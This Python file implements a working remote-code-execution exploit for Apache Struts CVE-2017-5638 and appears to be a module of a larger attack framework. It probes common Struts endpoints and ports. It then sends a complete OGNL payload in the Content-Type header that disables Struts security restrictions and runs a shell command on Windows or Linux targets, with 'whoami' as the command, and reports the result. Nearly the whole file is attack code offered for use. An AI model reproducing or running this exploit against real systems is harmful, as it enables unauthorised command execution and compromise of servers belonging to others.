"""
Apache Struts Exploit (CVE-2017-5638)
Remote Code Execution via Content-Type header
"""

import socket
import requests
from typing import Dict, Tuple
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Struts_Exploit(BaseExploit):
    """
    Apache Struts CVE-2017-5638 Exploit
    Targets: Apache Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10
    
    Attack Vector:
    - Content-Type header injection
    - OGNL expression evaluation
    - Remote Code Execution
    """
    
    def __init__(self):
        super().__init__(
            name="Apache_Struts_CVE-2017-5638",
            target_ports=[8080, 80, 443, 8443],
            target_os=["Windows", "Linux", "Unix"]
        )
        
        # Common Struts endpoints
        self.struts_endpoints = [
            "/struts2-showcase/",
            "/showcase.action",
            "/integration/saveGangster.action",
            "/orders/3",
            "/example/",
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if target is running vulnerable Struts"""
        ip = target['ip']
        
        for port in [8080, 80, 443, 8443]:
            if port in target.get('open_ports', []):
                try:
                    protocol = "https" if port in [443, 8443] else "http"
                    
                    # Try common Struts paths
                    for endpoint in self.struts_endpoints:
                        url = f"{protocol}://{ip}:{port}{endpoint}"
                        
                        # Send test request with OGNL payload
                        headers = {
                            'Content-Type': "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}"
                        }
                        
                        try:
                            response = requests.get(url, headers=headers, timeout=5, verify=False)
                            
                            # Check for Struts indicators
                            if 'struts' in response.text.lower() or 'xwork' in response.text.lower():
                                logger.debug(f"Struts detected on {ip}:{port}{endpoint}")
                                return True
                        except:
                            continue
                            
                except Exception as e:
                    logger.debug(f"Struts check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Struts exploitation"""
        ip = target['ip']
        
        logger.info(f"Attempting Struts CVE-2017-5638 on {ip}")
        
        # Find which port has Struts
        port = 8080
        endpoint = "/"
        
        for p in [8080, 80, 443, 8443]:
            if p in target.get('open_ports', []):
                for ep in self.struts_endpoints:
                    if self._test_struts_endpoint(ip, p, ep):
                        port = p
                        endpoint = ep
                        break
        
        protocol = "https" if port in [443, 8443] else "http"
        url = f"{protocol}://{ip}:{port}{endpoint}"
        
        try:
            # CVE-2017-5638 Payload
            # OGNL expression in Content-Type header
            cmd = "whoami"  # Test command
            
            payload = (
                "%{(#_='multipart/form-data')."
                "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                "(#_memberAccess?(#_memberAccess=#dm):"
                "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                "(#ognlUtil.getExcludedPackageNames().clear())."
                "(#ognlUtil.getExcludedClasses().clear())."
                "(#context.setMemberAccess(#dm))))."
                f"(#cmd='{cmd}')."
                "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                "(#p=new java.lang.ProcessBuilder(#cmds))."
                "(#p.redirectErrorStream(true)).(#process=#p.start())."
                "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                "(#ros.flush())}"
            )
            
            headers = {
                'Content-Type': payload,
                'User-Agent': 'Mozilla/5.0'
            }
            
            response = requests.post(url, headers=headers, timeout=10, verify=False)
            
            # Check if command executed
            if response.status_code == 200 and len(response.text) > 0:
                self.stats['success'] += 1
                logger.success(f"Struts RCE successful on {ip}")
                
                return True, {
                    'method': 'Struts_CVE-2017-5638',
                    'port': port,
                    'endpoint': endpoint,
                    'service': 'Apache Struts',
                    'rce': True,
                    'output': response.text[:200]
                }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Struts exploit error on {ip}: {e}")
            return False, {}
    
    def _test_struts_endpoint(self, ip: str, port: int, endpoint: str) -> bool:
        """Test if endpoint is Struts"""
        try:
            protocol = "https" if port in [443, 8443] else "http"
            url = f"{protocol}://{ip}:{port}{endpoint}"
            
            response = requests.get(url, timeout=3, verify=False)
            
            return 'struts' in response.text.lower() or 'xwork' in response.text.lower()
        except:
            return False


if __name__ == "__main__":
    # Test the exploit
    struts = Struts_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [8080],
        'os_guess': 'Linux'
    }
    
    print(f"Testing Struts exploit on {test_target['ip']}")
    
    if struts.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = struts.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
